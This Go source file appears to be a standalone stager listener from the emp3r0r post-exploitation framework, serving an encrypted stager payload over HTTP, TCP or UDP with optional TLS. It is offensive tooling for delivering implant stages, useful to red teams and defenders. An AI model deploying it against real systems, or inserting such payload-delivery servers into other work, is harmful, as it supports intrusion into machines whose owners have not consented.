package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"errors"
	"flag"
	"math/big"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/listener"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func main() {
	stagerPath := flag.String("stager", "", "path to the stager file to serve")
	port := flag.String("port", "8080", "port to serve the stager file on")
	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
	listenerType := flag.String("type", "http", "listener type: http, tcp, or udp")
	tlsEnabled := flag.Bool("tls", false, "serve HTTP over TLS (local testing only; use a CDN/nginx reverse proxy in production)")
	tlsCert := flag.String("tls-cert", "", "TLS certificate file (PEM). A self-signed cert is generated if omitted")
	tlsKey := flag.String("tls-key", "", "TLS private key file (PEM). A self-signed key is generated if omitted")
	flag.Parse()

	listener.SetNotifyCallback(func(msg string) {
		logging.Infof("%s", msg)
	})

	if *stagerPath == "" {
		logging.Fatal("stager file path is required")
	}

	switch *listenerType {
	case "http":
		if *tlsEnabled {
			tlsCfg, err := buildTLSConfig(*tlsCert, *tlsKey)
			if err != nil {
				logging.Fatalf("Failed to configure TLS: %v", err)
			}
			logging.Fatal(listener.HTTPListenerTLS(*stagerPath, *port, *keyStr, tlsCfg))
			return
		}
		logging.Fatal(listener.HTTPListener(*stagerPath, *port, *keyStr))
	case "tcp":
		logging.Fatal(listener.TCPListener(*stagerPath, *port, *keyStr))
	case "udp":
		logging.Fatal(listener.UDPListener(*stagerPath, *port, *keyStr))
	default:
		logging.Fatalf("Unknown listener type: %s (supported: http, tcp, udp)", *listenerType)
	}
}

// buildTLSConfig returns a TLS config for the standalone HTTP listener. It
// loads the given cert/key pair if provided, otherwise generates a self-signed
// certificate so `-tls` works out of the box for local testing.
func buildTLSConfig(certFile, keyFile string) (*tls.Config, error) {
	if certFile != "" || keyFile != "" {
		if certFile == "" || keyFile == "" {
			return nil, errors.New("both -tls-cert and -tls-key must be provided")
		}
		cert, err := tls.LoadX509KeyPair(certFile, keyFile)
		if err != nil {
			return nil, err
		}
		return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
	}
	return selfSignedTLSConfig()
}

// selfSignedTLSConfig generates an in-memory self-signed certificate valid for
// localhost/127.0.0.1, so `-tls` works without any cert management.
func selfSignedTLSConfig() (*tls.Config, error) {
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}

	template := x509.Certificate{
		SerialNumber: big.NewInt(time.Now().UnixNano()),
		Subject:      pkix.Name{CommonName: "stager-listener-local"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		DNSNames:     []string{"localhost"},
		IPAddresses:  []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")},
	}

	der, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})

	keyDER, err := x509.MarshalECPrivateKey(priv)
	if err != nil {
		return nil, err
	}
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})

	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
}
